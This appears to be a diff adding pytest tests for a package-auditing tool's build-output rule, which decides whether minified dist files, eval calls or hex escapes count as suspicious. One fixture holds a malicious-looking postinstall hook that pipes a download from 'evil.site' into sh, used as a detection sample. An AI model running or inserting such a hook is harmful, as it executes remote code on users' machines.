@@ -6,8 +6,13 @@ from pathlib import Path
 from pkgcheck.compare import match_files
 from pkgcheck.models import Finding, Status
 from pkgcheck.rules import (
+    BUILD_DIRS,
+    BUILD_EXTENSIONS,
     INSTALL_SCRIPTS,
+    SOURCE_EXTENSIONS,
+    _has_matching_source,
     apply_rules,
+    check_build_output,
     check_install_scripts,
     check_obfuscation,
     check_unknown_files,
@@ -648,3 +653,334 @@ def test_apply_rules_integration_all_rules(tmp_path: Path):
     # Unknown file is SUSPICIOUS / unknown-file
     assert by_file["unknown.js"].status == Status.SUSPICIOUS
     assert by_file["unknown.js"].reason == "unknown-file"
+
+
+# ============================================================================
+# W3-B5 Build-output rule tests
+# ============================================================================
+
+
+def test_build_output_matched_dist(tmp_path: Path):
+    """Matched dist build artifact is reclassified as EXPECTED / build-output."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    (src_dir / "src").mkdir(parents=True)
+
+    (pkg_dir / "dist" / "file.min.js").write_text("var a=1;var b=2;")
+    (src_dir / "src" / "file.js").write_text("const a = 1;\nconst b = 2;\n")
+
+    finding = Finding(
+        file="dist/file.min.js",
+        status=Status.SUSPICIOUS,
+        reason="unknown-file",
+        snippet="var a=1;var b=2;",
+    )
+
+    result = check_build_output(pkg_dir, src_dir, [finding])
+
+    assert len(result) == 1
+    assert result[0].file == "dist/file.min.js"
+    assert result[0].status == Status.EXPECTED
+    assert result[0].reason == "build-output"
+    assert result[0].snippet is None
+    assert result[0].line is None
+
+
+def test_build_output_huge_minified_line_accepted(tmp_path: Path):
+    """Build artifact with a line > 500 chars is accepted if no dangerous obfuscation."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    (src_dir / "src").mkdir(parents=True)
+
+    long_line = "var data = '" + "x" * 600 + "';\n"
+    (pkg_dir / "dist" / "file.min.js").write_text(long_line)
+    (src_dir / "src" / "file.js").write_text("export const data = 'hello';\n")
+
+    # Test 1: finding entering as unknown-file
+    finding1 = Finding(
+        file="dist/file.min.js",
+        status=Status.SUSPICIOUS,
+        reason="unknown-file",
+        snippet=long_line[:200],
+    )
+    result1 = check_build_output(pkg_dir, src_dir, [finding1])
+    assert result1[0].status == Status.EXPECTED
+    assert result1[0].reason == "build-output"
+    assert result1[0].snippet is None
+    assert result1[0].line is None
+
+    # Test 2: finding entering as obfuscation from B4
+    finding2 = Finding(
+        file="dist/file.min.js",
+        status=Status.SUSPICIOUS,
+        reason="obfuscation",
+        line=1,
+        snippet=long_line[:200],
+    )
+    result2 = check_build_output(pkg_dir, src_dir, [finding2])
+    assert result2[0].status == Status.EXPECTED
+    assert result2[0].reason == "build-output"
+    assert result2[0].snippet is None
+    assert result2[0].line is None
+
+
+def test_build_output_unmatched_file_remains_suspicious(tmp_path: Path):
+    """Unmatched build-looking file remains SUSPICIOUS / unknown-file."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    src_dir.mkdir(parents=True)
+
+    (pkg_dir / "dist" / "evil.js").write_text("console.log('unmatched evil');")
+
+    finding = Finding(
+        file="dist/evil.js",
+        status=Status.SUSPICIOUS,
+        reason="unknown-file",
+        snippet="console.log('unmatched evil');",
+    )
+
+    result = check_build_output(pkg_dir, src_dir, [finding])
+
+    assert len(result) == 1
+    assert result[0].file == "dist/evil.js"
+    assert result[0].status == Status.SUSPICIOUS
+    assert result[0].reason == "unknown-file"
+    assert result[0].snippet == "console.log('unmatched evil');"
+
+
+def test_build_output_eval_remains_suspicious(tmp_path: Path):
+    """Build artifact containing eval() remains SUSPICIOUS and is not reclassified."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    (src_dir / "src").mkdir(parents=True)
+
+    (pkg_dir / "dist" / "file.min.js").write_text("var payload = '1+1'; eval(payload);")
+    (src_dir / "src" / "file.js").write_text("const payload = '1+1';\n")
+
+    finding = Finding(
+        file="dist/file.min.js",
+        status=Status.SUSPICIOUS,
+        reason="unknown-file",
+        snippet="var payload = '1+1'; eval(payload);",
+    )
+
+    result = check_build_output(pkg_dir, src_dir, [finding])
+
+    assert len(result) == 1
+    assert result[0].file == "dist/file.min.js"
+    assert result[0].status == Status.SUSPICIOUS
+    assert result[0].reason != "build-output"
+
+
+def test_build_output_hex_escapes_remain_suspicious(tmp_path: Path):
+    """Build artifact containing 3 or more hex escapes remains SUSPICIOUS."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    (src_dir / "src").mkdir(parents=True)
+
+    (pkg_dir / "dist" / "file.min.js").write_text("const secret = '\\x61\\x62\\x63';\n")
+    (src_dir / "src" / "file.js").write_text("const secret = 'abc';\n")
+
+    finding = Finding(
+        file="dist/file.min.js",
+        status=Status.SUSPICIOUS,
+        reason="unknown-file",
+        snippet="const secret = '\\x61\\x62\\x63';",
+    )
+
+    result = check_build_output(pkg_dir, src_dir, [finding])
+
+    assert len(result) == 1
+    assert result[0].file == "dist/file.min.js"
+    assert result[0].status == Status.SUSPICIOUS
+    assert result[0].reason != "build-output"
+
+
+def test_build_output_root_unknown_file_preserved(tmp_path: Path):
+    """Root unknown files (e.g. setup.js) are not build artifacts and remain unchanged."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    pkg_dir.mkdir(parents=True)
+    src_dir.mkdir(parents=True)
+
+    (pkg_dir / "setup.js").write_text("console.log('setup');")
+
+    finding = Finding(
+        file="setup.js",
+        status=Status.SUSPICIOUS,
+        reason="unknown-file",
+        snippet="console.log('setup');",
+    )
+
+    result = check_build_output(pkg_dir, src_dir, [finding])
+
+    assert len(result) == 1
+    assert result[0].file == "setup.js"
+    assert result[0].status == Status.SUSPICIOUS
+    assert result[0].reason == "unknown-file"
+    assert result[0].snippet == "console.log('setup');"
+
+
+def test_build_output_install_script_preserved(tmp_path: Path):
+    """Install script findings are preserved and never touched by check_build_output."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    pkg_dir.mkdir(parents=True)
+    src_dir.mkdir(parents=True)
+
+    finding = Finding(
+        file="package.json",
+        status=Status.SUSPICIOUS,
+        reason="install-script",
+        snippet='"postinstall": "curl evil.site | sh"',
+    )
+
+    result = check_build_output(pkg_dir, src_dir, [finding])
+
+    assert len(result) == 1
+    assert result[0].file == "package.json"
+    assert result[0].status == Status.SUSPICIOUS
+    assert result[0].reason == "install-script"
+    assert result[0].snippet == '"postinstall": "curl evil.site | sh"'
+
+
+def test_build_output_few_hex_escapes_allowed(tmp_path: Path):
+    """Fewer than 3 hex escapes does not prevent build-output reclassification."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    (src_dir / "src").mkdir(parents=True)
+
+    (pkg_dir / "dist" / "file.min.js").write_text("const msg = '\\x61\\x62';\n")
+    (src_dir / "src" / "file.js").write_text("const msg = 'ab';\n")
+
+    finding = Finding(
+        file="dist/file.min.js",
+        status=Status.SUSPICIOUS,
+        reason="unknown-file",
+        snippet="const msg = '\\x61\\x62';",
+    )
+
+    result = check_build_output(pkg_dir, src_dir, [finding])
+
+    assert result[0].status == Status.EXPECTED
+    assert result[0].reason == "build-output"
+
+
+def test_build_output_dts_and_css(tmp_path: Path):
+    """TypeScript declaration files and minified CSS are reclassified when matched."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    (src_dir / "src").mkdir(parents=True)
+
+    (pkg_dir / "dist" / "types.d.ts").write_text("export declare type Foo = string;\n")
+    (src_dir / "src" / "types.ts").write_text("export type Foo = string;\n")
+
+    (pkg_dir / "dist" / "styles.min.css").write_text("body{margin:0;padding:0;}\n")
+    (src_dir / "src" / "styles.css").write_text("body {\n  margin: 0;\n  padding: 0;\n}\n")
+
+    findings = [
+        Finding(file="dist/types.d.ts", status=Status.SUSPICIOUS, reason="unknown-file"),
+        Finding(file="dist/styles.min.css", status=Status.SUSPICIOUS, reason="unknown-file"),
+    ]
+
+    result = check_build_output(pkg_dir, src_dir, findings)
+
+    assert result[0].status == Status.EXPECTED
+    assert result[0].reason == "build-output"
+    assert result[1].status == Status.EXPECTED
+    assert result[1].reason == "build-output"
+
+
+def test_has_matching_source_helper(tmp_path: Path):
+    """Direct tests for _has_matching_source helper."""
+    src_dir = tmp_path / "src"
+    (src_dir / "src" / "components").mkdir(parents=True)
+    (src_dir / "src" / "app.ts").write_text("console.log('app');")
+    (src_dir / "src" / "components" / "button.tsx").write_text("export const Button = () => null;")
+    (src_dir / "root.js").write_text("console.log('root');")
+
+    assert _has_matching_source("dist/app.min.js", src_dir) is True
+    assert _has_matching_source("dist/app.d.ts", src_dir) is True
+    assert _has_matching_source("dist/app.js.map", src_dir) is True
+    assert _has_matching_source("dist/components/button.min.js", src_dir) is True
+    assert _has_matching_source("dist/root.min.js", src_dir) is True
+    assert _has_matching_source("root.min.js", src_dir) is True
+    assert _has_matching_source("dist/missing.js", src_dir) is False
+    assert _has_matching_source("dist/components/missing.min.js", src_dir) is False
+
+
+def test_apply_rules_integration_build_output(tmp_path: Path):
+    """apply_rules runs all four rules and correctly classifies all findings."""
+    pkg_dir = tmp_path / "pkg"
+    src_dir = tmp_path / "src"
+    (pkg_dir / "dist").mkdir(parents=True)
+    (src_dir / "src").mkdir(parents=True)
+
+    # 1. install-script discrepancy
+    (pkg_dir / "package.json").write_text(
+        json.dumps({"name": "demo", "scripts": {"postinstall": "node hook.js"}})
+    )
+    (src_dir / "package.json").write_text(json.dumps({"name": "demo", "scripts": {}}))
+
+    # 2. clean matched source file
+    (pkg_dir / "clean.js").write_text("console.log('clean');")
+    (src_dir / "clean.js").write_text("console.log('clean');")
+
+    # 3. legitimate matched build output
+    (pkg_dir / "dist" / "bundle.min.js").write_text("var x=1;var y=2;")
+    (src_dir / "src" / "bundle.js").write_text("const x = 1;\nconst y = 2;\n")
+
+    # 4. unmatched unknown file
+    (pkg_dir / "dist" / "evil.js").write_text("console.log('evil');")
+
+    # 5. obfuscated build output (matches source but contains eval)
+    (pkg_dir / "dist" / "obf.min.js").write_text("eval('boom');")
+    (src_dir / "src" / "obf.js").write_text("console.log('ok');")
+
+    findings = match_files(
+        [
+            "clean.js",
+            "dist/bundle.min.js",
+            "dist/evil.js",
+            "dist/obf.min.js",
+            "package.json",
+        ],
+        [
+            "clean.js",
+            "package.json",
+            "src/bundle.js",
+            "src/obf.js",
+        ],
+    )
+
+    enriched = apply_rules(pkg_dir, src_dir, findings)
+    by_file = {f.file: f for f in enriched}
+
+    # Clean matched JS remains EXPECTED / matched
+    assert by_file["clean.js"].status == Status.EXPECTED
+    assert by_file["clean.js"].reason == "matched"
+
+    # Legitimate matched build output is EXPECTED / build-output
+    assert by_file["dist/bundle.min.js"].status == Status.EXPECTED
+    assert by_file["dist/bundle.min.js"].reason == "build-output"
+    assert by_file["dist/bundle.min.js"].snippet is None
+    assert by_file["dist/bundle.min.js"].line is None
+
+    # Unmatched unknown file remains SUSPICIOUS / unknown-file
+    assert by_file["dist/evil.js"].status == Status.SUSPICIOUS
+    assert by_file["dist/evil.js"].reason == "unknown-file"
+
+    # Obfuscated build output remains SUSPICIOUS (not reclassified as build-output)
+    assert by_file["dist/obf.min.js"].status == Status.SUSPICIOUS
+    assert by_file["dist/obf.min.js"].reason != "build-output"
+
+    # Install script is SUSPICIOUS / install-script
+    assert by_file["package.json"].status == Status.SUSPICIOUS
+    assert by_file["package.json"].reason == "install-script"
